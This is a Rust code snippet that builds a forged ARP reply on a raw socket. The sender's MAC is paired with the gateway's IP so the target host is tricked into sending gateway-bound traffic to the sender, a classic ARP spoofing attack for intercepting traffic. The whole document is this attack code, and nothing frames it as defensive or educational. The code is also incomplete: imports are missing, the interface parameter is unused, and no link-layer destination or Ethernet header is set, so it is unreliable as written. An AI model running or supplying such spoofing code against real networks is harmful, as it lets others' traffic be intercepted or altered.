use std::net::Ipv4Addr;

#[repr(C, packed)]
struct ArpPacket {
    htype: u16,
    ptype: u16,
    hlen: u8,
    plen: u8,
    oper: u16,
    sha: [u8; 6], // Source MAC
    spa: [u8; 4], // Source IP
    tha: [u8; 6], // Target MAC
    tpa: [u8; 4], // Target IP
}

fn send_arp_reply(interface: &str, target_mac: [u8; 6], target_ip: Ipv4Addr, gateway_ip: Ipv4Addr, my_mac: [u8; 6]) {
    let sock = unsafe { socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP as u16) as i32) };
    if sock < 0 {
        return;
    }

    let mut sockaddr: sockaddr_ll = unsafe { std::mem::zeroed() };
    sockaddr.sll_family = AF_PACKET as u16;
    sockaddr.sll_protocol = htons(ETH_P_ARP as u16);

    let arp_reply = ArpPacket {
        htype: htons(1),  // Ethernet
        ptype: htons(0x0800), // IPv4
        hlen: 6,
        plen: 4,
        oper: htons(2), // ARP Reply
        sha: my_mac,    // Your MAC (pretending to be the gateway)
        spa: gateway_ip.octets(),
        tha: target_mac,
        tpa: target_ip.octets(),
    };

    // Send ARP reply
    unsafe {
        libc::sendto(
            sock,
            &arp_reply as *const _ as *const _,
            std::mem::size_of::<ArpPacket>(),
            0,
            &sockaddr as *const sockaddr_ll as *const _,
            std::mem::size_of::<sockaddr_ll>() as u32,
        );
    }
}
